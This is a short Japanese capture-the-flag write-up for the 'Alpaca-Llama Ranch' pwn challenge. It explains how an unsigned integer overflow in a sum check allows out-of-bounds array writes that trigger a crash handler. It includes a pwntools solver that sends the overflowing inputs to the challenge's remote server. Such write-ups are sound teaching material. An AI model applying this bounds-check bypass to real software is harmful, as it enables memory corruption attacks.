---
title: "Daily Alpacahack Inu Profile Writeup"
tags: ["Overflow", "c", "Pwn"]
---

# Alpaca-Llama Ranch

## / Overview

整数のオーバーフローを用いた配列の範囲外アクセス

## / Writeup

`chal.c`を確認すると、`SIGSEGV`を意図的に発生させることが目的だと分かります。これを実現させるには`animal_numbers`の配列外へアクセスしなければなりません。しかし`alpaca+llama > MAX_N_ANIMAL`でプログラムは終了されるため、一見不可能なように見えます。

ここで変数`alpaca`, `llama`が`unsigned`型であることに注目します。これは $`0`$ から $`2^{32}-1`$ までを表現できる符号なし整数型ですが、足し算の結果$`2^{32}`$になると数を表現できずに $`0`$ に戻ってしまいます(オーバーフロー)。つまり`alpaca`に$`2^{32}-1`$を代入して`llama`に$`1`$を代入することで判定をすり抜けることが出来ます。後は`alpaca`の分、$`2^{32}-1`$ 回は書き込むことができるので、領域外書き込みによってSIGSEGVを発生させ、handlerを起動させることができます。

## / Solver

```python
from pwn import *

p = remote("34.170.146.252", 62492)

p.recvuntil(b'Input the number of alpaca.')
p.sendline(b'-1')

p.recvuntil(b'Input the number of llama.')
p.sendline(b'1')

# ループ回数はデバッグしながら決めてください
for i in range(505):
    p.recvuntil(b'Input the identity number.')
    p.sendline(b'0')
    
p.interactive()
```